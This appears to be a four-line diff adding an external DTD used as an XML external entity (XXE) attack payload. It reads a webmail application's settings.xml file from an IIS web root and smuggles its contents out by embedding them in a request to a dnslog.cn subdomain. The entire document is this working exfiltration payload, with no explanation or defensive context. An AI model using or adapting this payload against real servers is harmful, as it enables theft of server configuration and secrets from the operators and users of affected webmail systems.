@@ -1,0 +1,4 @@
+<!ENTITY % payl SYSTEM
+"file://c:/inetpub/wwwroot/apps/webmail/app_data/settings/settings.xml">
+<!ENTITY % int "<!ENTITY &#37; trick SYSTEM '
+http://%payl;.es6al0.dnslog.cn/'>">
